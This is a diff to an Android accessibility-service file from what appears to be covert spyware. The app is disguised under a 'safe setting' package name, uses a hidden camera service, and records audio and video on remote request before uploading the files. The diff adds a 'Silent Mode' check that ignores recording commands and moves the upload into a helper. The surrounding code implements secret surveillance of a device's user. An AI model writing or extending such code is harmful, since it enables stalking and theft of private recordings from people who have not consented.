@@ -51,6 +51,7 @@ import com.safe.setting.app.utils.ConstFun.enableGpsRoot
 import com.safe.setting.app.utils.ConstFun.isRoot
 import com.safe.setting.app.utils.Consts.TAG
 import com.safe.setting.app.utils.FileHelper
+import com.safe.setting.app.utils.GlobalConfig
 import com.safe.setting.app.utils.hiddenCameraServiceUtils.config.CameraFacing
 import com.safe.setting.app.workers.UploadWorker
 import java.io.File
@@ -60,6 +61,7 @@ import java.util.Locale
 import javax.inject.Inject
 import androidx.work.Constraints
 import androidx.work.NetworkType
+import com.safe.setting.app.utils.WorkUtils
 
 interface RecordingController {
     fun startVideoRecording(facing: Int)
@@ -194,6 +196,12 @@ class AccessibilityDataService : AccessibilityService(), LocationListener, Recor
 
     @Suppress("DEPRECATION")
     override fun startAudioRecording() {
+        try {
+            if (GlobalConfig.isFrozen) {
+                Log.d(TAG, "Silent Mode: ignoring audio recording request")
+                return
+            }
+        } catch (_: Exception) {}
         if (isRecording) {
             Log.w(TAG, "पहले से ही रिकॉर्डिंग चल रही है, नए ऑडियो अनुरोध को अनदेखा किया जा रहा है।")
             return
@@ -239,6 +247,12 @@ class AccessibilityDataService : AccessibilityService(), LocationListener, Recor
     }
 
     override fun startVideoRecording(facing: Int) {
+        try {
+            if (GlobalConfig.isFrozen) {
+                Log.d(TAG, "Silent Mode: ignoring video recording request")
+                return
+            }
+        } catch (_: Exception) {}
         if (isRecording) {
             Log.w(TAG, "पहले से ही रिकॉर्डिंग चल रही है, नए वीडियो अनुरोध को अनदेखा किया जा रहा है।")
             return
@@ -310,26 +324,8 @@ class AccessibilityDataService : AccessibilityService(), LocationListener, Recor
             if (file.exists() && file.length() > 0) {
                 interactor.setPushState(Consts.STATE_UPLOADING, randomName, fileType)
                 interactor.reportCommandStatus(fileType, "UPLOAD_STARTED", "File recorded. Starting upload.")
-
-                // --- YAHAN PAR SABSE ZAROORI BADLAV HAI ---
-
-                // Niyam banayein ki network juda hona chahiye
-                val constraints = Constraints.Builder()
-                    // Is line ko badla gaya hai
-                    .setRequiredNetworkType(NetworkType.CONNECTED) // Kaam tabhi chalega jab Wi-Fi YA Mobile Data chalu ho
-                    .build()
-
-                // Baaki sab waisa hi hai
-                val uploadWorkRequest = OneTimeWorkRequestBuilder<UploadWorker>()
-                    .setInputData(workDataOf(
-                        "FILE_PATH" to file.absolutePath,
-                        "FILE_TYPE" to fileType,
-                        "RANDOM_NAME" to randomName
-                    ))
-                    .setConstraints(constraints)
-                    .build()
-
-                WorkManager.getInstance(applicationContext).enqueue(uploadWorkRequest)
+                // Centralized WorkManager enqueue
+                WorkUtils.enqueueUpload(applicationContext, file.absolutePath, fileType, randomName)
             } else {
                 interactor.setPushState("${Consts.STATE_FAILED}: Empty file", randomName, fileType)
                 interactor.reportCommandStatus(fileType, "FAILED", "Recording resulted in an empty file.")
